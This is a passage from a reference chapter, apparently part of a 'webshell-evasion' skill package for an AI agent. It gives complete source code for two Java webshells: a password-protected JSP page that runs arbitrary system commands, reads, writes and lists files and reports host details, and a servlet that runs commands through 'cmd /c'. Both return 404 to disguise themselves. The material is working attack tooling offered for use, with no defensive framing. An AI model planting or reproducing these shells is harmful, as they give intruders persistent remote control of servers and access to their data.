### 3.4 JSP WebShell

```java
<%@ page import="java.io.*,java.util.*,java.net.*,java.sql.*" %>
<%
String pass = "admin2026";
String p = request.getParameter("pass");
if (!pass.equals(p)) {
    response.setStatus(404);
    return;
}

String action = request.getParameter("a");
String data = request.getParameter("d");

if ("cmd".equals(action)) {
    Process proc = Runtime.getRuntime().exec(data);
    BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream(), "GBK"));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) out.println(line);
    // Error stream
    BufferedReader errReader = new BufferedReader(new InputStreamReader(proc.getErrorStream(), "GBK"));
    while ((line = errReader.readLine()) != null) out.println(line);
    out.println("</pre>");
} else if ("read".equals(action)) {
    BufferedReader br = new BufferedReader(new FileReader(data));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    out.println("</pre>");
    br.close();
} else if ("write".equals(action)) {
    String[] parts = data.split("\\|", 2);
    FileWriter fw = new FileWriter(parts[0]);
    fw.write(parts[1]);
    fw.close();
    out.println("Written: " + parts[0]);
} else if ("ls".equals(action)) {
    File dir = new File(data != null ? data : ".");
    for (File f : dir.listFiles()) {
        out.println((f.isDirectory() ? "[D] " : "[F] ") + f.getAbsolutePath() + " (" + f.length() + " bytes)<br>");
    }
} else {
    out.println("<h1>JSP WebShell</h1>");
    out.println("<p>Server: " + application.getServerInfo() + "</p>");
    out.println("<p>User: " + System.getProperty("user.name") + "</p>");
    out.println("<p>OS: " + System.getProperty("os.name") + "</p>");
    out.println("<p>Java: " + System.getProperty("java.version") + "</p>");
    out.println("<p>Current Dir: " + new File(".").getAbsolutePath() + "</p>");
}
%>
```

### 3.5 Java Servlet Memory-Ready WebShell

```java
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class ShellServlet extends HttpServlet {
    private static final String PASS = "admin2026";

    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        resp.setContentType("text/html;charset=UTF-8");
        PrintWriter out = resp.getWriter();

        if (!PASS.equals(req.getParameter("pass"))) {
            resp.setStatus(404);
            return;
        }

        String action = req.getParameter("a");
        String data = req.getParameter("d");

        try {
            if ("cmd".equals(action)) {
                Process p = Runtime.getRuntime().exec(
                    new String[]{"cmd", "/c", data});
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), "GBK"));
                String line;
                out.println("<pre>");
                while ((line = reader.readLine()) != null) out.println(line);
                out.println("</pre>");
            } else if ("read".equals(action)) {
                // File read logic
            } else if ("info".equals(action)) {
                out.println("Java: " + System.getProperty("java.version"));
                out.println("OS: " + System.getProperty("os.name"));
                out.println("User: " + System.getProperty("user.name"));
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
```



---
📖 本切片 3/4 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-03-multi-language-webshell-04.md")`